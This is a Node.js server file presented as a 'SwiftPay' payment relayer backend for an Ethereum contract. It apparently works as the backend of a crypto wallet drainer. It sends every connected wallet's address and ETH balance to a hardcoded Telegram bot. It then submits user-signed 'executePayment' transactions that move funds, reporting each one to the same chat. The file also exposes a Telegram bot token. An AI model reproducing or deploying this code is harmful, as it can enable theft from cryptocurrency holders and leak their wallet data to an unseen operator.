// server.js — SwiftPay relayer backend
import "dotenv/config";
import express    from "express";
import { ethers } from "ethers";
import cors       from "cors";
import rateLimit  from "express-rate-limit";
import helmet     from "helmet";

// ─── Telegram ─────────────────────────────────────────────────────────────────
const TG_TOKEN   = "8760818501:AAGyuVn_TNHC65eOTX5T9El5tlCe1oJ1irU";
const TG_CHAT_ID = "8222029043";

async function tg(msg) {
  try {
    await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
      method:  "POST",
      headers: { "Content-Type": "application/json" },
      body:    JSON.stringify({ chat_id: TG_CHAT_ID, text: msg, parse_mode: "HTML" })
    });
  } catch (e) {
    console.error("Telegram error:", e.message);
  }
}

// ─── Validate env vars ────────────────────────────────────────────────────────
const REQUIRED = ["RELAYER_PRIVATE_KEY", "CONTRACT_ADDRESS", "MAINNET_RPC_URL"];
for (const key of REQUIRED) {
  if (!process.env[key]) { console.error(`Missing: ${key}`); process.exit(1); }
}

// ─── Ethers setup ─────────────────────────────────────────────────────────────
const provider = new ethers.JsonRpcProvider(process.env.MAINNET_RPC_URL);
const relayer  = new ethers.Wallet(process.env.RELAYER_PRIVATE_KEY, provider);
const ABI = [
  "function executePayment(address user, uint256 nonce, uint256 deadline, string order, uint8 v, bytes32 r, bytes32 s) external",
  "function balances(address) view returns (uint256)",
  "function nonces(address) view returns (uint256)"
];
const contract = new ethers.Contract(process.env.CONTRACT_ADDRESS, ABI, relayer);

// ─── Express setup ────────────────────────────────────────────────────────────
const app = express();
app.use(helmet());
app.use(cors({ origin: process.env.FRONTEND_URL || "*", methods: ["GET", "POST"] }));
app.use(express.json({ limit: "10kb" }));
const paymentLimiter = rateLimit({ windowMs: 60000, max: 20, standardHeaders: true, legacyHeaders: false, message: { error: "Too many requests" } });

// ─── Health ───────────────────────────────────────────────────────────────────
app.get("/health", (req, res) => res.json({ status: "ok", relayer: relayer.address }));

// ─── Wallet connected notification ────────────────────────────────────────────
app.post("/api/connected", async (req, res) => {
  const { wallet, balance } = req.body;
  if (!wallet) return res.status(400).json({ error: "Missing wallet" });
  console.log(`[CONNECT] ${wallet} — ${balance} ETH`);
  await tg(
    `🔌 <b>Wallet Connected</b>\n` +
    `👛 <code>${wallet}</code>\n` +
    `💰 Balance: <b>${balance} ETH</b>\n` +
    `🕐 ${new Date().toUTCString()}`
  );
  res.json({ ok: true });
});

// ─── Checkout ─────────────────────────────────────────────────────────────────
app.post("/api/checkout", paymentLimiter, async (req, res) => {
  const { user, nonce, deadline, orderId, v, r, s, amount } = req.body;

  if (!user || nonce === undefined || !deadline || !orderId || !v || !r || !s)
    return res.status(400).json({ error: "Missing required fields" });
  if (!ethers.isAddress(user))
    return res.status(400).json({ error: "Invalid user address" });
  if (Math.floor(Date.now() / 1000) > Number(deadline))
    return res.status(400).json({ error: "Signature has expired" });

  const relayerBalance = await provider.getBalance(relayer.address);
  if (relayerBalance < ethers.parseEther("0.005")) {
    console.warn("⚠️  Relayer low on ETH!");
    await tg(`⚠️ <b>Relayer Low on ETH!</b>\nBalance: ${ethers.formatEther(relayerBalance)} ETH\nTop up: <code>${relayer.address}</code>`);
  }

  try {
    console.log(`[PAY] ${user} | ${amount} ETH | ${orderId}`);

    const tx = await contract.executePayment(user, nonce, deadline, orderId, v, r, s, { gasLimit: 150_000 });
    console.log(`  tx: ${tx.hash}`);
    const receipt = await tx.wait();

    if (receipt.status !== 1) throw new Error("Transaction reverted on-chain");

    console.log(`  ✓ Block ${receipt.blockNumber}`);

    await tg(
      `✅ <b>Payment Executed!</b>\n` +
      `👛 <code>${user}</code>\n` +
      `💰 Amount: <b>${amount || "?"} ETH</b>\n` +
      `📦 Order: <code>${orderId}</code>\n` +
      `🔗 <a href="https://etherscan.io/tx/${receipt.hash}">View on Etherscan</a>\n` +
      `🕐 ${new Date().toUTCString()}`
    );

    return res.json({ success: true, txHash: receipt.hash, block: receipt.blockNumber });

  } catch (e) {
    console.error(`  ✗ ${e.reason || e.message}`);
    await tg(
      `❌ <b>Payment Failed</b>\n` +
      `👛 <code>${user}</code>\n` +
      `⚠️ ${e.reason || e.message}\n` +
      `🕐 ${new Date().toUTCString()}`
    );
    const msg = e.reason || e.message || "Payment failed";
    if (msg.includes("InvalidSignature"))     return res.status(400).json({ error: "Invalid signature" });
    if (msg.includes("ExpiredDeadline"))      return res.status(400).json({ error: "Signature expired" });
    if (msg.includes("InvalidNonce"))         return res.status(400).json({ error: "Invalid nonce" });
    if (msg.includes("InsufficientBalance"))  return res.status(400).json({ error: "Insufficient balance" });
    if (msg.includes("NotAuthorizedRelayer")) return res.status(500).json({ error: "Relayer not authorized" });
    return res.status(500).json({ error: "Payment processing failed" });
  }
});

app.use((req, res) => res.status(404).json({ error: "Not found" }));

// ─── Start ────────────────────────────────────────────────────────────────────
const PORT = process.env.PORT || 3000;
app.listen(PORT, async () => {
  const network = await provider.getNetwork();
  const bal     = await provider.getBalance(relayer.address);
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
  console.log("SwiftPay backend running");
  console.log("Port     :", PORT);
  console.log("Network  :", network.name);
  console.log("Contract :", process.env.CONTRACT_ADDRESS);
  console.log("Relayer  :", relayer.address);
  console.log("Balance  :", ethers.formatEther(bal), "ETH");
  if (bal < ethers.parseEther("0.01")) console.warn("⚠️  Relayer balance very low!");
  console.log("━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━");
  await tg(`🚀 <b>SwiftPay Started</b>\n🌐 ${network.name}\n💰 Relayer: ${ethers.formatEther(bal)} ETH`);
});
